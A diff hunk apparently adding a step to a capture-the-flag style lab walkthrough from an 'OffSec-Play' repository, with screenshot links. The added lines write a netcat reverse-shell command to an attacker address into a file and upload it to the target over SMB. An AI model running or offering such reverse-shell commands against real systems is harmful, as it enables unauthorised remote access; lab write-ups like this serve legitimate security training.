@@ -231,3 +231,12 @@ http://192.168.187.11/logs/management.log
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/6b37f922-baa0-4c5e-b1c1-e30889ee9c6e)
 
+Reverse Shell
+```
+echo "nc -e /bin/sh 192.168.45.245 1337" > product-control
+```
+Upload Reverse Shell
+```
+smb: \> put product-control 
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/c26c9700-4d05-4fa1-9ac3-0e7807c53f85)
